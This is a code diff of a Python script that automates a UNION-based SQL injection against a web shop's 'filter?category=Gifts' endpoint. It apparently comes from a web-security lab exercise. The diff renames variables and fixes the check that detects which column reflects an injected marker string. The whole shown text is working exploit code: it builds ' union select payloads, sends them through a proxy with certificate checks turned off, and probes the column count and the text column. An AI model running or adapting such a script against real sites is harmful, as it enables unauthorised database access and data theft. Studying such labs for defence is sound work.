@@ -20,11 +20,11 @@ def get_exploit_column_number(url):
             return number - 1
     raise ValueError("Max number of tries exceeded, 50")
 
-def get_exploit_sqli_string_field(url, num_col):
+def get_exploit_sqli_string_field(url, column_number):
     uri = "filter?category=Gifts"
-    for number in range(1, num_col+1):
+    for number in range(1, column_number+1):
         string = "'JgLv7K'"
-        payload_list = ['null'] * num_col
+        payload_list = ['null'] * column_number
         payload_list[number-1] = string
         sql_payload = (
             "' union select " + 
@@ -34,9 +34,7 @@ def get_exploit_sqli_string_field(url, num_col):
             url + uri + sql_payload,
             verify=False,
             proxies=proxies)
-        if (response.text.count(
-                string.strip('\'')) == 2 
-                in response.text):
+        if response.text.count(string.strip('\'')) == 2:
             return number
     raise ValueError("Could not find the string column")
 
@@ -46,8 +44,8 @@ if __name__ == "__main__":
         print("[+] Figuring out number of columns...")
         column_number = get_exploit_column_number(url)
         print("[+] The number of columns is " + str(column_number) + "." )
-        string_column = get_exploit_sqli_string_field(url, column_number)
-        print("[+] The column that contains text is " + str(string_column) + ".")
+        string_column_number = get_exploit_sqli_string_field(url, column_number)
+        print("[+] The column that contains text is " + str(string_column_number) + ".")
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
         print("[-] Example: %s www.example.com" % sys.argv[0])
